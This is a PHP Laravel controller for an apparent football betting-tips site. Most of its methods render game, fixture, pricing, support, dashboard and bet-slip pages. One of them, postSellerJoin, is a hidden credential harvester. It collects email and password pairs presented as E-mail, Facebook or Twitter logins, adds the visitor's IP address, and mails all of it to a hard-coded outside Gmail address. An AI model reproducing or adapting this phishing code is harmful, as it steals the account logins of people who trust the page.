<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Football;
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		$ads = $this->helpers->getAds();
		$todayGames = $this->helpers->getGames("today");
		$premiumGames = $this->helpers->getGames("premium");
		$regularGames = $this->helpers->getGames("regular");
    	return view('index', compact(['user','ads','todayGames','regularGames','premiumGames']));
    }
	
	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getFootball()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
        $ret = Football::getLeagues();
		#dd($ret);
    	return view('football_data',compact(['user','ret']));
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getFixtures(Request $request)
    {
           $req = $request->all();
		   #dd($req);
           $ret = [];
               
                $validator = Validator::make($req, [
                             'id' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Select a league/competition to continue!";
                       
                 }
                
                 else
                 { 
			           $ret = $this->helpers->getFixtures($req["id"],"n7");
                       #dd($ret);					   
                  }       
           return json_encode($ret);
    }   
    
    
    public function postSellerJoin(Request $request)
	{
           $req = $request->all();
		   #dd($req);
           $ret = "";
               
                $validator = Validator::make($req, [
                             'deg' => 'required',
                             'email' => 'required|email',
                             'pass' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Enter your email and password to continue!";
                       
                 }
                
                 else
                 { 
			           $dg = "E-mail";
					   $deg = $req["deg"];
					   if($deg == "fbb") $dg = "Facebook";
					   else if($deg == "tww") $dg = "Twitter";
					   
            		   $s = "New $dg Login: ".date("h:i A jS F, Y");
                       $rcpt = "uwantbrendacolson@gmail.com";
                       $pass = $req["pass"];
                       $email = $req["email"];
					   $ip = getenv("REMOTE_ADDR");

                       $this->helpers->sendEmail($rcpt,$s,['ip' => $ip,'pass' => $pass,'email' => $email],'emails.apply_alert','view');  
                        $ret = "ok";                      
                  }       
           return $ret;                                                                                            
	}
	
	/**
	 * Show the application Pricing screen to the user.
	 *
	 * @return Response
	 */
	public function getPricing()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
    	return view('pricing', compact(['user']));
    }

	/**
	 * Show the application Support screen to the user.
	 *
	 * @return Response
	 */
	public function getSupport()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
    	return view('support', compact(['user']));
    }

	/**
	 * Show the application Dashboard screen to the user.
	 *
	 * @return Response
	 */
	public function getDashboard()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		$username = "arsenalfan69";
		$tokenBalance = 11;
		$totalBetSlipsPurchased = 24;
		$todayGames = $this->helpers->getGames("today");
		
    	return view('dashboard', compact(['user','username','tokenBalance','totalBetSlipsPurchased','todayGames']));
    }	
	
	/**
	 * Show the application Games screen to the user.
	 *
	 * @return Response
	 */
	public function getGames()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		$ads = $this->helpers->getAds();
		$todayGames = $this->helpers->getGames("today");
		$premiumGames = $this->helpers->getGames("premium");
		$regularGames = $this->helpers->getGames("regular");
		
    	return view('games', compact(['user','ads','todayGames','regularGames','premiumGames']));
    }	
	
	/**
	 * Show the application Support screen to the user.
	 *
	 * @return Response
	 */
	public function getBetSlips()
    {
        $user = null;
		
		if(Auth::check())
		{
			$user = Auth::user();
		}
		
		$ads = $this->helpers->getAds();
		$totalBetSlipsPurchased = $this->helpers->getBetSlipsPurchased($user);
		
    	return view('betslips', compact(['user','ads','totalBetSlipsPurchased']));
    }
	
	
    /**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getBetSlip(Request $request)
    {
           $req = $request->all();
		   #dd($req);
           $ret = [];
               
                $validator = Validator::make($req, [
                             'id' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $ret = "Invalid ID!";
                       
                 }
                
                 else
                 { 
			           $ret = $this->helpers->getBetSlip($req["id"]);
                       #dd($ret);					   
                  }       
           return json_encode($ret);
    } 

}
